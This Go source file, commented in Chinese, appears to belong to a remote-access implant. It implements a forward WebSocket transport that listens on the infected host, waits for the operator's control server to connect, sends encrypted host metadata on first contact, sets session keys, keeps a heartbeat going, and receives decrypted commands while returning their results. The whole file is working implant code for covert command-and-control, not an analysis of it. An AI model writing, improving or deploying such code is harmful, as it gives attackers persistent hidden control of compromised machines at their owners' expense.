//go:build transport_ws_forward

package main

import (
	"implant/core/app"
	"implant/core/debuglog"
	"implant/core/communication"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"fmt"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// listenerType 监听器类型（服务端 patch 与 FirstBlood 用）
const listenerType = "ws_forward"

// NewTransport 构造 ws_forward 传输（单二进制 build tag 入口）
func NewTransport() transportClient {
	return &WSForwardClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// connected 当前是否已连接
func (c *WSForwardClient) IsConnected() bool { return c.connected }

// ReconnectMgr 返回重连管理器
func (c *WSForwardClient) ReconnectMgr() *reconnect.ReconnectManager { return c.reconnectMgr }

type WSForwardClient struct {
	Listener     net.Listener
	Server       *http.Server
	Connection   *websocket.Conn
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	stopCh       chan struct{}
	recvCh       chan []byte
	doneCh       chan struct{}
	doneOnce     sync.Once
	connectedCh  chan error
	sendMutex    sync.Mutex // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
	upgrader     websocket.Upgrader
}

func (c *WSForwardClient) fail() {
	c.connected = false
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectFailed()
	}
	c.markDone()
}

func (c *WSForwardClient) markDone() {
	c.doneOnce.Do(func() { close(c.doneCh) })
}

// Connect 在 spec（listenAddr:port）上启动 WebSocket 服务（/ws），等待服务端握手连入，
// 然后 FirstBlood + 会话密钥 + 心跳。阻塞直到有服务端连入或出错。
func (c *WSForwardClient) Connect(spec string) error {
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectAttempt()
	}
	// 【重连修复】关闭旧监听器/HTTP服务/旧连接：fail() 只清理连接，runLoop 重连时
	// 旧 Listener 仍占用端口 → net.Listen EADDRINUSE 永久失败
	if c.Connection != nil {
		c.Connection.Close()
		c.Connection = nil
	}
	if c.Server != nil {
		c.Server.Close()
		c.Server = nil
	}
	if c.Listener != nil {
		c.Listener.Close()
		c.Listener = nil
	}
	c.recvCh = make(chan []byte, 16)
	c.doneCh = make(chan struct{})
	c.doneOnce = sync.Once{}
	c.connectedCh = make(chan error, 1)
	c.upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}

	mux := http.NewServeMux()
	mux.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		conn, err := c.upgrader.Upgrade(w, r, nil)
		if err != nil {
			select {
			case c.connectedCh <- err:
			default:
			}
			return
		}
		c.Connection = conn
		c.connected = true
		debuglog.Printf("✅ [WS-FORWARD] 服务端连入: %s\n", conn.RemoteAddr())

		// MetaInfo + FirstBlood
		if len(utils.MetaInfo) == 0 {
			utils.MetaInfo, _ = utils.EncryptedMetaInfo()
			utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
		}
		if err := c.rawSend(utils.BytesCombine(utils.WriteInt(1), utils.MetaInfo)); err != nil {
			select {
			case c.connectedCh <- err:
			default:
			}
			return
		}

		// 会话密钥（ws_forward 用占位符 key，与服务端 ws_forward 分支一致）
		salt, masterKey := app.GetListenerKeyConfig("ws_forward")
		if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
			select {
			case c.connectedCh <- err:
			default:
			}
			return
		}
		if c.reconnectMgr != nil {
			c.reconnectMgr.OnReconnectSuccess()
		}

		// 心跳：重连时先停旧心跳循环 + 关旧 stopCh，防 goroutine 随重连堆积
		if c.stopCh != nil {
			close(c.stopCh)
		}
		c.stopCh = make(chan struct{})
stop := c.stopCh
	go app.HeartbeatLoop(stop, c.keepAlive)

		go c.readLoop()
		select {
		case c.connectedCh <- nil:
		default:
		}
	})

	ln, err := net.Listen("tcp", spec)
	if err != nil {
		c.fail()
		return err
	}
	c.Listener = ln
	c.Server = &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}
	go func() {
		if err := c.Server.Serve(ln); err != nil && err != http.ErrServerClosed {
			debuglog.Printf("❌ [WS-FORWARD] HTTP 服务退出: %v\n", err)
		}
	}()
	debuglog.Printf("✅ [WS-FORWARD] 监听 %s，等待服务端连接...\n", spec)

	// 阻塞等待服务端连入（与 TCP/KCP 正向 Accept 语义一致）
	err = <-c.connectedCh
	if err != nil {
		c.fail()
		return err
	}
	return nil
}

// readLoop 读取服务端下发的命令：base64(encrypted) 直写，无帧头。
func (c *WSForwardClient) readLoop() {
	for {
		_, data, err := c.Connection.ReadMessage()
		if err != nil {
			debuglog.Printf("❌ [WS-FORWARD] 读取失败: %v\n", err)
			c.fail()
			return
		}
		if len(data) == 0 {
			continue
		}
		rawData, err := encrypt.DecodeBase64(data)
		if err != nil {
			continue
		}
		decrypted, err := communication.DecryptCommand(rawData)
		if err != nil {
			continue
		}
		// 【会话密钥唯一化】消费服务端下发的 nonce 协商消息（type=4）
		if decrypted, err = communication.ConsumeSessionNonce(decrypted); err != nil {
			continue
		}
		if decrypted == nil {
			continue
		}
		select {
		case c.recvCh <- decrypted:
		case <-c.doneCh:
			return
		}
	}
}

// Recv 从 recvCh 取一条已解密命令；doneCh 关闭时返回错误。
func (c *WSForwardClient) Recv() ([]byte, error) {
	select {
	case data, ok := <-c.recvCh:
		if !ok {
			return nil, fmt.Errorf("连接关闭")
		}
		return data, nil
	case <-c.doneCh:
		return nil, fmt.Errorf("连接断开")
	}
}

// SendResult 按 WebSocket 分帧回送：normalData(2) | MetaLen | MetaInfo | b64Packet（无长度前缀，直接 SendBinaryMessage）。
func (c *WSForwardClient) SendResult(b64Packet []byte) error {
	msgToSend := utils.BytesCombine(utils.WriteInt(2), communication.FrameResult(b64Packet))
	return c.rawSend(msgToSend)
}

func (c *WSForwardClient) rawSend(msg []byte) error {
	c.sendMutex.Lock()
	defer c.sendMutex.Unlock()
	defer func() { _ = recover() }()
	if c.Connection == nil {
		return fmt.Errorf("连接为空")
	}
	return c.Connection.WriteMessage(websocket.BinaryMessage, msg)
}

func (c *WSForwardClient) keepAlive() {
		c.rawSend(communication.HeartbeatMsg())
}

func (c *WSForwardClient) Close() error {
	if c.stopCh != nil {
		close(c.stopCh)
		c.stopCh = nil
	}
	c.markDone()
	if c.Connection != nil {
		c.Connection.Close()
		c.Connection = nil
	}
	if c.Server != nil {
		c.Server.Close()
		c.Server = nil
	}
	if c.Listener != nil {
		c.Listener.Close()
		c.Listener = nil
	}
	return nil
}